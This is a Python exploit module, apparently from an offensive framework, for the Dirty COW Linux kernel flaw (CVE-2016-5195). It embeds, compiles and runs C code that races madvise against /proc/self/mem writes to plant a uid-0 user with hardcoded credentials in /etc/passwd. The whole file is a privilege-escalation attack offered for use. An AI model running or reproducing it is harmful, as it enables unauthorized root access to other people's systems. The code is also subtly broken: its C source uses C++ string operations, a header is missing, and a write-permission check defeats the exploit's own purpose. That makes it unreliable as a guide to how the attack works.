#!/usr/bin/env python3
"""
Dirty COW (CVE-2016-5195) Privilege Escalation Exploit
=====================================================

Exploits the Dirty COW vulnerability to escalate privileges on vulnerable Linux systems.
This is a local privilege escalation exploit.

Author: Brainless Security Team
Module: exploits/linux/local/dirty_cow
Type: exploit
Rank: excellent
"""

import os
import sys
import subprocess
import tempfile
import time
from pathlib import Path

# Add framework path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
from core.logger import LoggerMixin

NAME = "Dirty COW - CVE-2016-5195"
DESCRIPTION = "Exploits Dirty COW vulnerability for local privilege escalation"
AUTHOR = "Brainless Security Team"
VERSION = "1.0"
RANK = "excellent"
MODULE_TYPE = "exploit"

class DirtyCowExploit(LoggerMixin):
    """
    Exploits CVE-2016-5195 (Dirty COW) for local privilege escalation
    """
    
    def __init__(self):
        super().__init__('DirtyCowExploit')
        self.target_file = "/etc/passwd"
        self.backup_file = None
        self.payload_user = "brainless"
        self.payload_password = "brainless123"
        
    def set_option(self, option: str, value: str):
        """Set module options"""
        if option.lower() == 'target_file':
            self.target_file = value
        elif option.lower() == 'payload_user':
            self.payload_user = value
        elif option.lower() == 'payload_password':
            self.payload_password = value
    
    def get_options(self) -> dict:
        """Get module options"""
        return {
            'TARGET_FILE': {'description': 'File to modify (default: /etc/passwd)', 'required': False, 'default': '/etc/passwd'},
            'PAYLOAD_USER': {'description': 'Username to add', 'required': False, 'default': 'brainless'},
            'PAYLOAD_PASSWORD': {'description': 'Password for new user', 'required': False, 'default': 'brainless123'}
        }
    
    def check_vulnerability(self) -> bool:
        """
        Check if system is vulnerable to Dirty COW
        """
        try:
            # Check kernel version
            result = subprocess.run(['uname', '-r'], capture_output=True, text=True)
            kernel_version = result.stdout.strip()
            
            self.info(f"Kernel version: {kernel_version}")
            
            # Parse version
            version_parts = kernel_version.split('.')
            if len(version_parts) >= 2:
                major = int(version_parts[0])
                minor = int(version_parts[1])
                
                # Vulnerable versions: 2.6.22 < version < 4.8.3
                if (major == 2 and minor >= 6) or (major == 3) or (major == 4 and minor < 8):
                    self.info("System appears to be vulnerable to Dirty COW")
                    return True
                elif major == 4 and minor == 8 and len(version_parts) > 2:
                    patch = int(version_parts[2].split('-')[0])
                    if patch < 3:
                        self.info("System appears to be vulnerable to Dirty COW")
                        return True
            
            self.warning("System does not appear to be vulnerable to Dirty COW")
            return False
            
        except Exception as e:
            self.error(f"Error checking vulnerability: {e}")
            return False
    
    def create_exploit_c(self) -> str:
        """
        Create the Dirty COW exploit C code
        """
        c_code = f'''
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>

const char *filename = "{self.target_file}";
const char *backup_filename = "{self.target_file}.dirtycow_backup";
const char *new_line = "{self.payload_user}:x:0:0:root:/root:/bin/bash\\n";

void *map;
int f;

struct stat st;
char *contents;

void *madviseThread(void *arg) {{
    char *str = (char *)arg;
    int i, c = 0;
    for(i = 0; i < 1000000; i++) {{
        c += madvise(map, 100, MADV_DONTNEED);
    }}
    return NULL;
}}

void *procselfmemThread(void *arg) {{
    char *str = (char *)arg;
    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    off_t offset = (off_t)map;
    lseek(f, offset, SEEK_SET);
    for(i = 0; i < 1000000; i++) {{
        c += write(f, str, strlen(str));
    }}
    return NULL;
}}

int main(int argc, char *argv[]) {{
    pthread_t pth1, pth2;
    
    // Create backup
    system("cp " + std::string(filename) + " " + std::string(backup_filename));
    
    // Open target file
    f = open(filename, O_RDONLY);
    fstat(f, &st);
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    
    // Find target line
    char *target = strstr((char *)map, "root:x:0:0:root:/root:/bin/bash");
    if (!target) {{
        target = strstr((char *)map, "root:x:0:0:root:/root:/bin/sh");
    }}
    
    if (!target) {{
        printf("[-] Could not find target line in %s\\n", filename);
        return 1;
    }}
    
    // Create thread to modify memory
    pthread_create(&pth1, NULL, madviseThread, (void *)filename);
    pthread_create(&pth2, NULL, procselfmemThread, (void *)new_line);
    
    // Wait for threads
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    
    printf("[+] Exploit completed\\n");
    return 0;
}}
'''
        
        try:
            # Write C code to temporary file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.c', delete=False) as f:
                f.write(c_code)
                return f.name
        except Exception as e:
            self.error(f"Error creating exploit C file: {e}")
            return None
    
    def compile_exploit(self, c_file: str) -> str:
        """
        Compile the exploit C code
        """
        try:
            binary_file = c_file.replace('.c', '')
            
            result = subprocess.run(
                ['gcc', '-o', binary_file, c_file],
                capture_output=True, text=True
            )
            
            if result.returncode == 0:
                self.info(f"Successfully compiled exploit: {binary_file}")
                return binary_file
            else:
                self.error(f"Compilation failed: {result.stderr}")
                return None
                
        except Exception as e:
            self.error(f"Error compiling exploit: {e}")
            return None
    
    def run_exploit(self, binary_file: str) -> bool:
        """
        Run the compiled exploit
        """
        try:
            self.info("Running Dirty COW exploit...")
            
            result = subprocess.run(
                [binary_file],
                capture_output=True, text=True, timeout=30
            )
            
            if result.returncode == 0:
                self.info("Exploit executed successfully")
                return True
            else:
                self.error(f"Exploit failed: {result.stderr}")
                return False
                
        except subprocess.TimeoutExpired:
            self.error("Exploit execution timed out")
            return False
        except Exception as e:
            self.error(f"Error running exploit: {e}")
            return False
    
    def verify_exploit(self) -> bool:
        """
        Verify that the exploit was successful
        """
        try:
            with open(self.target_file, 'r') as f:
                content = f.read()
                if self.payload_user in content:
                    self.info(f"Successfully added user {self.payload_user} to {self.target_file}")
                    return True
                else:
                    self.error("Exploit verification failed - user not found")
                    return False
        except Exception as e:
            self.error(f"Error verifying exploit: {e}")
            return False
    
    def cleanup(self):
        """
        Clean up exploit files
        """
        try:
            # Restore backup if exploit failed
            backup_file = f"{self.target_file}.dirtycow_backup"
            if os.path.exists(backup_file):
                subprocess.run(['cp', backup_file, self.target_file])
                os.unlink(backup_file)
                self.info("Restored backup file")
        except Exception as e:
            self.error(f"Error during cleanup: {e}")
    
    def run(self) -> dict:
        """
        Main exploit execution
        """
        try:
            self.info("Starting Dirty COW privilege escalation exploit")
            
            # Check if system is vulnerable
            if not self.check_vulnerability():
                return {'success': False, 'message': 'System does not appear to be vulnerable'}
            
            # Check if we have write permissions
            if not os.access(self.target_file, os.W_OK):
                return {'success': False, 'message': f'No write permissions for {self.target_file}'}
            
            # Create exploit C code
            c_file = self.create_exploit_c()
            if not c_file:
                return {'success': False, 'message': 'Failed to create exploit code'}
            
            try:
                # Compile exploit
                binary_file = self.compile_exploit(c_file)
                if not binary_file:
                    return {'success': False, 'message': 'Failed to compile exploit'}
                
                try:
                    # Run exploit
                    success = self.run_exploit(binary_file)
                    
                    if success:
                        # Verify exploit
                        if self.verify_exploit():
                            return {
                                'success': True,
                                'message': f'Privilege escalation successful! Added user {self.payload_user}',
                                'user': self.payload_user,
                                'password': self.payload_password
                            }
                        else:
                            self.cleanup()
                            return {'success': False, 'message': 'Exploit execution failed verification'}
                    else:
                        self.cleanup()
                        return {'success': False, 'message': 'Exploit execution failed'}
                        
                finally:
                    # Clean up binary
                    if os.path.exists(binary_file):
                        os.unlink(binary_file)
                        
            finally:
                # Clean up C file
                if os.path.exists(c_file):
                    os.unlink(c_file)
                    
        except Exception as e:
            self.error(f"Exploit execution failed: {e}")
            self.cleanup()
            return {'success': False, 'message': f'Exploit failed: {str(e)}'}


def run(options: dict = None) -> dict:
    """
    Entry point for the exploit module
    """
    exploit = DirtyCowExploit()
    
    # Set options if provided
    if options:
        for key, value in options.items():
            exploit.set_option(key, value)
    
    return exploit.run()


if __name__ == '__main__':
    # Example usage
    options = {
        'TARGET_FILE': '/etc/passwd',
        'PAYLOAD_USER': 'brainless',
        'PAYLOAD_PASSWORD': 'brainless123'
    }
    
    result = run(options)
    print(result)